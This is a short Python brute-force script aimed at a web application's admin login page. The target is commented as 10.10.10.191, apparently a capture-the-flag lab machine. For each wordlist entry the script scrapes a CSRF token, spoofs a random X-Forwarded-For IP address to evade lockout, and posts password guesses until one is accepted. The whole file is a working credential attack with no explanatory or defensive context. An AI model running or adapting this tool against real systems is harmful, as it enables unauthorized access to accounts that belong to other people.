import requests
import random
import socket
import struct
import codecs
import optparse

# BASE_URL = 'http://10.10.10.191/admin/login'

def get_csrf(session_obj, base_url):
	r = session_obj.get(base_url)
	from bs4 import BeautifulSoup
	html = r.text
	handler = BeautifulSoup(html, "html.parser")
	token = handler.find("input", {"name" : "tokenCSRF"}).get('value')
	return token

def generate_payload(session_obj, csrf_token, randIp, tmpPass, username, base_url):
	print("[*] " + "=" * 40)
	print(f"[*] X-Forwarded-IP : {rand_ip}")
	print(f"[*] CSRF Token : {csrf_token}")
	print("[*] Trying key : {}".format(tmpPass))
	data = {"tokenCSRF" : csrf_token, "username" : username, "password" : tmpPass}
	headers = {"X-Forwarded-For" : randIp}
	r = session_obj.post(base_url, data = data, headers = headers, allow_redirects = False)
	print("[*] Status Code : {}".format(r.status_code))
	raw = r.text
	print("[*] " + "=" * 40)
	if "incorrect" in raw:
		return False
	else:
		return True

if "__main__" in __name__:
	parser = optparse.OptionParser("Usage : %prog [options] URL")
	parser.add_option("-U", "--user", dest = "username", default="admin" , type = "string", help = "specify username")
	parser.add_option("-W", "--wordlist", dest = "wordlist", default="" , type = "string", help = "specify wordlist to read")
	(options, args) = parser.parse_args()
	if len(args) != 1:
		parser.error("Invalid arguments passed")
	print("[+] Bruteforcer starting...")
	username = options.username
	wordlist = options.wordlist
	base_url = args[0]
	with open(wordlist, 'r', errors = 'replace') as f:
		_line = f.readline()
		while _line:
			rand_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
			s = requests.Session()
			csrf_token = get_csrf(s, base_url)	
			is_running = generate_payload(s, csrf_token, rand_ip, _line.strip(), username, base_url)
			if is_running:
				print(f"\n[+] Password found : {_line.strip()}")
				break
			_line = f.readline()